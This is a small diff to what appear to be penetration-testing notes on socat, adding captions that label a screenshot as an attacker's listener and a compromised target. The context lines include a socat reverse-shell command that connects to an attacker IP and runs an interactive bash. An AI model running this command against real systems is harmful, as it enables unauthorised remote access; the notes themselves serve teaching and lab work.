@@ -66,6 +66,8 @@ socat TCP-L:<port> FILE:`tty`,raw,echo=0
 socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
 <img src="https://user-images.githubusercontent.com/73976100/222942912-2b022e20-e9f5-4b14-b888-465bcee32fad.png">  
+left: listener running on our local attacking machine  
+right: compromised target  
 <details>
 
 - pty, allocates a pseudoterminal on the target -- part of the stabilisation process
